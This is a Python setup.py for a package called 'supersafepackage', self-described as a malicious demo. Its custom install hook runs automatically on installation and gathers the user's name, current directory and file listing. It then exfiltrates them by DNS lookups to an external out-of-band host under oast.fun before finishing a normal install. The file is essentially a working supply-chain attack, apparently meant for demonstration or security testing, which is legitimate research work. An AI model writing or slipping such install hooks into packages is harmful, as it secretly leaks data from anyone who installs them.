import os
import getpass
from setuptools import setup, find_packages
from setuptools.command.install import install

#  Define malicious custom install
class MaliciousInstall(install):
    def run(self):
        user = getpass.getuser()

        # Grab current directory
        pwd = os.popen("pwd").read().strip()

        # List files
        ls = os.popen("ls").read().strip()

        # Combine and format the data for DNS-safe exfil
        # You can encode or truncate if too long
        safe_user = user.replace('.', '-')
        safe_pwd = pwd.replace('/', '-')
        safe_ls = ls.replace(' ', '_').replace('\n', '_')

        # Send multiple DNS pings
        os.system(f"nslookup {safe_user}.whoami.dbwgovzrtoclyqrugbqep4d7rn1lljtoe.oast.fun")
        os.system(f"nslookup {safe_pwd}.pwd.dbwgovzrtoclyqrugbqep4d7rn1lljtoe.oast.fun")
        os.system(f"nslookup {safe_ls}.ls.dbwgovzrtoclyqrugbqep4d7rn1lljtoe.oast.fun")

        # Proceed with normal installation
        install.run(self)

# Setup definition
setup(
    name='supersafepackage',
    version='3.0.5',
    description='Malicious demo package',
    packages=find_packages(),
    cmdclass={'install': MaliciousInstall},
)
